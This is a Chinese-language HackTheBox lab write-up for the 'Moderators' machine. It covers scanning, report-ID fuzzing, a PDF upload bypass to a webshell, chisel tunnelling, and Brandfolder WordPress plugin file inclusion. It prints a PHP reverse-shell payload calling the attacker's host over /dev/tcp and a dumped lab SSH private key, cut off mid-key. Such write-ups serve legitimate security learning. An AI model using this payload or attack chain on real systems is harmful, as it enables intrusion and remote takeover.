<!DOCTYPE html>
<html>
<head>
    

    

    



    <meta charset="utf-8">
    
    
    
    
    <title>Moderators - HackTheBox | 喵喵喵喵 | 某鱼唇的人类</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="theme-color" content="#66CCFF">
    
    
    <meta name="keywords" content="HackTheBox">
    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;485  10.10.11.173                                                                                                              端口扫描22和80: 12345678">
<meta property="og:type" content="article">
<meta property="og:title" content="Moderators - HackTheBox">
<meta property="og:url" content="https://darkwing.moe/2022/09/29/Moderators-HackTheBox/index.html">
<meta property="og:site_name" content="喵喵喵喵">
<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;485  10.10.11.173                                                                                                              端口扫描22和80: 12345678">
<meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022092901.jpg">
<meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022092902.jpg">
<meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022092903.jpg">
<meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022092904.jpg">
<meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022092905.jpg">
<meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022092906.jpg">
<meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022092907.jpg">
<meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022092908.jpg">
<meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022092909.jpg">
<meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022092910.jpg">
<meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022092911.jpg">
<meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022092912.jpg">
<meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022092913.jpg">
<meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022092914.jpg">
<meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022092915.jpg">
<meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022092916.jpg">
<meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022092917.jpg">
<meta property="article:published_time" content="2022-09-29T07:40:57.000Z">
<meta property="article:modified_time" content="2022-11-07T01:01:03.748Z">
<meta property="article:author" content="暗羽">
<meta property="article:tag" content="HackTheBox">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022092901.jpg">
    
        <link rel="alternate" type="application/atom+xml" title="喵喵喵喵" href="/atom.xml">
    
    <link rel="shortcut icon" href="/favicon.ico">
    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
    <script>window.lazyScripts=[]</script>

    <!-- custom head -->
    

<meta name="generator" content="Hexo 4.2.0"></head>

<body>
    <div id="loading" class="active"></div>

    <aside id="menu" class="hide" >
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">暗羽</h5>
          <a href="mailto:1126955201@qq.com" title="1126955201@qq.com" class="mail">1126955201@qq.com</a>
        </hgroup>
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="waves-block waves-effect">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                主页
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                Archives
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                Tags
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                Categories
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://github.com/zjicmDarkWing" target="_blank" >
                <i class="icon icon-lg icon-github"></i>
                Github
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://twitter.com/darkwing_nya" target="_blank" >
                <i class="icon icon-lg icon-gratipay"></i>
                Twitter
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://darkwing.moe/2015/01/01/about/"  >
                <i class="icon icon-lg icon-link"></i>
                About
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row">
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">Moderators - HackTheBox</div>
        
        <div class="search-wrap" id="search-wrap">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                <i class="icon icon-lg icon-chevron-left"></i>
            </a>
            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                <i class="icon icon-lg icon-search"></i>
            </a>
        </div>
        
        
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
            <i class="icon icon-lg icon-share-alt"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">

    <div class="container fade-scale">
        <h1 class="title">Moderators - HackTheBox</h1>
        <h5 class="subtitle">
            
                <time datetime="2022-09-29T07:40:57.000Z" itemprop="datePublished" class="page-time">
  2022-09-29
</time>


            
        </h5>
    </div>

    


</header>


<div class="container body-wrap">
    
    <aside class="post-widget">
        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
            <h4>TOC</h4>
            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#基本信息"><span class="post-toc-number">1.</span> <span class="post-toc-text">基本信息</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#10-10-11-173"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">10.10.11.173</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#端口扫描"><span class="post-toc-number">2.</span> <span class="post-toc-text">端口扫描</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#80"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">80</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#目录扫描"><span class="post-toc-number">3.</span> <span class="post-toc-text">目录扫描</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#logs"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">logs</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#report-FUZZ"><span class="post-toc-number">4.</span> <span class="post-toc-text">report FUZZ</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#9798"><span class="post-toc-number">4.1.</span> <span class="post-toc-text">9798</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#2589"><span class="post-toc-number">4.2.</span> <span class="post-toc-text">2589</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#upload"><span class="post-toc-number">5.</span> <span class="post-toc-text">upload</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#webshell"><span class="post-toc-number">5.1.</span> <span class="post-toc-text">webshell</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#信息"><span class="post-toc-number">6.</span> <span class="post-toc-text">信息</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#8080"><span class="post-toc-number">6.1.</span> <span class="post-toc-text">8080</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#wordpress-exploit"><span class="post-toc-number">7.</span> <span class="post-toc-text">wordpress exploit</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#wp-load-php"><span class="post-toc-number">7.1.</span> <span class="post-toc-text">wp-load.php</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#lexi-id-rsa"><span class="post-toc-number">7.2.</span> <span class="post-toc-text">lexi_id_rsa</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#user-flag"><span class="post-toc-number">8.</span> <span class="post-toc-text">user flag</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#信息-1"><span class="post-toc-number">8.1.</span> <span class="post-toc-text">信息</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#wordpress"><span class="post-toc-number">8.2.</span> <span class="post-toc-text">wordpress</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#john-id-rsa"><span class="post-toc-number">8.3.</span> <span class="post-toc-text">john_id_rsa</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#John"><span class="post-toc-number">9.</span> <span class="post-toc-text">John</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#vdi-crack"><span class="post-toc-number">9.1.</span> <span class="post-toc-text">vdi crack</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#changed-vbox"><span class="post-toc-number">9.2.</span> <span class="post-toc-text">changed_vbox</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#提权-amp-root-flag"><span class="post-toc-number">10.</span> <span class="post-toc-text">提权 &amp; root flag</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#shadow"><span class="post-toc-number">10.1.</span> <span class="post-toc-text">shadow</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#参考资料"><span class="post-toc-number">11.</span> <span class="post-toc-text">参考资料</span></a></li></ol>
        </nav>
    </aside>


<article id="post-Moderators-HackTheBox"
  class="post-article article-type-post fade" itemprop="blogPost">

    <div class="post-card">
        <h1 class="post-card-title">Moderators - HackTheBox</h1>
        <div class="post-meta">
            <time class="post-time" title="2022-09-29 15:40:57" datetime="2022-09-29T07:40:57.000Z"  itemprop="datePublished">2022-09-29</time>

            


            
<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
</span>


        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            <h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><ul>
<li><p><a href="https://www.hackthebox.com/home/machines/profile/485" target="_blank" rel="noopener">https://www.hackthebox.com/home/machines/profile/485</a></p>
</li>
<li><h2 id="10-10-11-173"><a href="#10-10-11-173" class="headerlink" title="10.10.11.173"></a>10.10.11.173</h2></li>
</ul>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022092901.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>22和80:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV -Pn 10.10.11.173</span></span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2022-09-29 13:20 CST</span><br><span class="line">Nmap scan report for 10.10.11.173</span><br><span class="line">Host is up (0.19s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (conn-refused)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   3072 390316061130a0b0c2917988d3931b3e (RSA)</span><br><span class="line">|   256 51945c593bbdbcb6267aef837f4cca7d (ECDSA)</span><br><span class="line">|_  256 a56d03fa6cf5b94aa2a1b6bdbc604231 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Moderators</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 74.59 seconds</span><br></pre></td></tr></table></figure>



<h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>某安全公司官网之类的：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022092902.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>公开有几份report，可以知道参数格式：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022092903.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h1><p>扫描发现一个logs目录，直接访问是空白:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> gobuster dir -w ~/Tools/dict/SecLists/Discovery/Web-Content/common.txt  -t 50 -u http://10.10.11.173/ -x html,txt,php</span></span><br><span class="line"></span><br><span class="line">/about.php            (Status: 200) [Size: 11539]</span><br><span class="line">/blog.php             (Status: 200) [Size: 13163]</span><br><span class="line">/contact.php          (Status: 200) [Size: 10084]</span><br><span class="line">/css                  (Status: 301) [Size: 310] [--&gt; http://10.10.11.173/css/]</span><br><span class="line">/images               (Status: 301) [Size: 313] [--&gt; http://10.10.11.173/images/]</span><br><span class="line">/index.php            (Status: 200) [Size: 11150]</span><br><span class="line">/logs                 (Status: 301) [Size: 311] [--&gt; http://10.10.11.173/logs/]</span><br><span class="line">/reports.php          (Status: 302) [Size: 7888] [--&gt; index.php]</span><br><span class="line">/service.php          (Status: 200) [Size: 9411]</span><br></pre></td></tr></table></figure>

<h2 id="logs"><a href="#logs" class="headerlink" title="logs"></a>logs</h2><p>logs目录继续扫描发现uploads:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -w ~/Tools/dict/SecLists/Discovery/Web-Content/common.txt  -t 50 -u http://10.10.11.173/logs/</span><br><span class="line"></span><br><span class="line">/uploads              (Status: 301) [Size: 319] [--&gt; http://10.10.11.173/logs/uploads/]</span><br></pre></td></tr></table></figure>

<h1 id="report-FUZZ"><a href="#report-FUZZ" class="headerlink" title="report FUZZ"></a>report FUZZ</h1><p>根据上面的格式fuzz，发现一些未公开的report：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w ~/Tools/dict/SecLists/Fuzzing/4-digits-0000-9999.txt -u "http://10.10.11.173/reports.php?report=FUZZ" -fs 7888</span><br><span class="line"></span><br><span class="line">2589                    [Status: 200, Size: 9786, Words: 3714, Lines: 275, Duration: 213ms]</span><br><span class="line">3478                    [Status: 200, Size: 9831, Words: 3740, Lines: 276, Duration: 204ms]</span><br><span class="line">4221                    [Status: 200, Size: 9880, Words: 3811, Lines: 274, Duration: 200ms]</span><br><span class="line">4750                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 5392ms]</span><br><span class="line">7612                    [Status: 200, Size: 9790, Words: 3704, Lines: 276, Duration: 807ms]</span><br><span class="line">8121                    [Status: 200, Size: 9784, Words: 3723, Lines: 274, Duration: 195ms]</span><br><span class="line">9798                    [Status: 200, Size: 9887, Words: 3771, Lines: 277, Duration: 194ms]</span><br></pre></td></tr></table></figure>

<h2 id="9798"><a href="#9798" class="headerlink" title="9798"></a>9798</h2><p>9798中得到logs下路径，就是report id的md5:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> -n 9798 | md5sum</span></span><br><span class="line">e21cece511f43a5cb18d4932429915ed  -</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022092904.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="2589"><a href="#2589" class="headerlink" title="2589"></a>2589</h2><p>2589对应md5目录下继续探测发现logs.pdf(坑，没提示完全想不到):</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ echo -n 2589 | md5sum</span><br><span class="line">743c41a921516b04afde48bb48e28ce6  -</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;10.10.11.173&#x2F;logs&#x2F;743c41a921516b04afde48bb48e28ce6&#x2F;logs.pdf</span><br></pre></td></tr></table></figure>

<p>文件给出上传途径：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022092905.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022092906.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h1><p>文件上传绕过一些pdf相关校验成功上传pdf，路径结合前面的信息可以猜到在uploads目录下，禁用了很多函数：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022092907.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022092908.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><p>蚁剑秒了：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022092909.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="信息"><a href="#信息" class="headerlink" title="信息"></a>信息</h1><p>简单的枚举，发现本地8080端口，转发出来访问：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022092910.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="8080"><a href="#8080" class="headerlink" title="8080"></a>8080</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">local</span></span></span><br><span class="line">./chisel_1.7.0-rc7_darwin_amd64 server -p 8000 --reverse</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> target</span></span><br><span class="line">./chisel_1.7.6_linux_amd64 client 10.10.14.19:8000 R:8080:127.0.0.1:8080 &amp;</span><br></pre></td></tr></table></figure>

<p>是一个wordpress,需要改一下hosts，因为现在是本地端口访问：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 moderators.htb</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022092911.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>结合服务器上信息，发现存在漏洞的插件：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022092912.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<ul>
<li>WordPress Plugin Brandfolder 3.0 - Local/Remote File Inclusion - PHP webapps Exploit<br><a href="https://www.exploit-db.com/exploits/39591" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/39591</a></li>
</ul>
<h1 id="wordpress-exploit"><a href="#wordpress-exploit" class="headerlink" title="wordpress exploit"></a>wordpress exploit</h1><p>不能RFI，直接本地写个php文件之后LFI即可得到lexi用户shell</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget http://10.10.14.19:7777/wp-load.php</span><br><span class="line"></span><br><span class="line">curl "http://localhost:8080/wp-content/plugins/brandfolder/callback.php?wp_abspath=/var/www/html/logs/uploads/"</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022092913.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>lexi用户目录可以拿到私钥，方便后续操作：</p>
<h2 id="wp-load-php"><a href="#wp-load-php" class="headerlink" title="wp-load.php"></a>wp-load.php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">"bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.19/4444 0&gt;&amp;1'"</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="lexi-id-rsa"><a href="#lexi-id-rsa" class="headerlink" title="lexi_id_rsa"></a>lexi_id_rsa</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span><br><span class="line">NhAAAAAwEAAQAAAYEAmHVovmMN+t0u52ea6B357LfXjhIuTG4qkX6eY4iCw7EBGKwaEryn</span><br><span class="line">ECxvN0TbZia5MhfHhJDL88bk2CososBm6i0phnvPo5facWeOzP3vdIiJYdP0XrZ5mNMLbM</span><br><span class="line">ONvoGU8p8LKhlfzHIBqhPxB4N7Dgmcmg2DJ&#x2F;QRXYrblAj8Bo1owGebWUBlB&#x2F;tMcO3Yqvaa</span><br><span class="line">QCuzVluSShMrGKJVjL0n2Uvqf&#x2F;Dw4ouQK3TwXdzrluhCo9icb+2QdA7KxmInb71+OT6rWV</span><br><span class="line">dQ5ymZTot+&#x2F;qALnzlDkeUlT&#x2F;RWtqJxJc6MlWy5&#x2F;neegZRRd3YNhln&#x2F;1GyL5aN&#x2F;0O1gBwf3</span><br><span class="line">vY87IYFXK&#x2F;W0a9Tj5mZ0RNDEOU+wSicM9nS3jabM1Unocq7jw36UPHQhniso6Q7ObvMnWv</span><br><span class="line">cxbVFo9M2axqTTnr&#x2F;gFkLzU0sj8ms4nxoRagCvc8oOUpMXoauEwEwdpbq3FfT8aKGYKl64</span><br><span class="line">vO+aJxiTPkPpgI6L+pWCYfLXIXwcbVo2xXp3euHLAAAFiI1Y9VaNWPVWAAAAB3NzaC1yc2</span><br><span class="line">EAAAGBAJh1aL5jDfrdLudnmugd+ey3144SLkxuKpF+nmOIgsOxARisGhK8pxAsbzdE22Ym</span><br><span class="line">uTIXx4SQy&#x2F;PG5NgqLKLAZuotKYZ7z6OX2nFnjsz973SIiWHT9F62eZjTC2zDjb6BlPKfCy</span><br><span class="line">oZX8xyAaoT8QeDew4JnJoNgyf0EV2K25QI&#x2F;AaNaMBnm1lAZQf7THDt2Kr2mkArs1ZbkkoT</span><br><span class="line">KxiiVYy9J9lL6n&#x2F;w8OKLkCt08F3c65boQqPYnG&#x2F;tkHQOysZiJ2+9fjk+q1lXUOcpmU6Lfv</span><br><span class="line">6gC585Q5HlJU&#x2F;0VraicSXOjJVsuf53noGUUXd2DYZZ&#x2F;9Rsi+Wjf9DtYAcH972POyGBVyv1</span><br><span class="line">tGvU4+ZmdETQxDlPsEonDPZ0t42mzNVJ6HKu48N+lDx0IZ4rKOkOzm7zJ1r3MW1RaPTNms</span><br><span class="line">ak056&#x2F;4BZC81NLI&#x2F;JrOJ8aEWoAr3PKDlKTF6GrhMBMHaW6txX0&#x2F;GihmCpeuLzvmicYkz5D</span><br><span class="line">6YCOi&#x2F;qVgmHy1yF8HG1aNsV6d3rhywAAAAMBAAEAAAGAUZ2o8SL9&#x2F;OojjeW8274QaVURpB</span><br><span class="line">C&#x2F;kFL5nuH10LrnpfM&#x2F;7wFTA+zSUqo275OBEHJyegqY2LLbPCmhoMcTFh2B+qMqs7&#x2F;cLGvC</span><br><span class="line">mSsjG0JlyjC9uw1IqNtuxQ1V9GfLncyo&#x2F;CmARI1I552wnmgGhEsyuRUULLRHHkBee4E2g0</span><br><span class="line">07&#x2F;hX9meLdGy6J53f0OBBcCUny0Z+TZguniNgyHgHpYmpwxrcJVmyZx+2GxHzZoKX&#x2F;yM2V</span><br><span class="line">vzjapmC7ECZLD2DEU+FQua6YHGw2KOs5tiX7BLQLr2R4cqz0akMZZJ0utIEWgDi5dX&#x2F;EYy</span><br><span class="line">y8HfqtCPWmplcrhtw&#x2F;DTRVLLCtiL0zzmYMiqvgh6OQZmFcLd0B0jbvBq3fq2l+UAMcUrWp</span><br><span class="line">o1D3Rv&#x2F;KRIVRog9+7e6r8aRVPf&#x2F;vIXy+jJlaWcG5Tq7a7wWwGQcqVW3aGnZivvc2aYMWVu</span><br><span class="line">x4G5F1sD9bamasGARP&#x2F;j0UNTeBNai+Lg1WDIHOzxq8bQhI0Xvdp2reFFzLGn8ePh0hAAAA</span><br><span class="line">wEaFdCpqhzFIqnwgDxrrQJ4QlvysZbMCVgxApzM5SLtAt6jQLBCLrOwe&#x2F;DYpdFOjIK888U</span><br><span class="line">0IRMzUtQjoP+RNU1PJZtB+neDkw6Kl1Muf4DCnTXr9mwyVlMQHmW1asWiEDr66YqLiKSF6</span><br><span class="line">CZHYRpFM4qUA+w3ABi8OJ+wzs+KDVk4Aw+v+AotbL9JStLBksR5P08sxAivWT&#x2F;KbXMifJn</span><br><span class="line">LrcrmS&#x2F;t+QdOG2Vf&#x2F;7ebYiyBbg1TD4BUAsjKZs8kByr6PoKQAAAMEAyQ1JW3&#x2F;xrUZyhlWn</span><br><span class="line">NnYVC0xcmSAkl90jHyW5AhR+5neuIu548xnk8a3PSO6j3w7kEmJTiOorwzAdM&#x2F;u9CqWiaU</span><br><span class="line">h7E4bnCEoakAlftaJsXWUtf1G7ZXcK587Ccxv330XHToH4HqF408oC&#x2F;mM40&#x2F;JNJ9Rqa9Io</span><br><span class="line">9azk0fEjIQmjF0GqdNTBfSNqoqZX7HTV34FO+8mj+7fFvrFOnHKsa2FiwADUgEmkw2jJ63</span><br><span 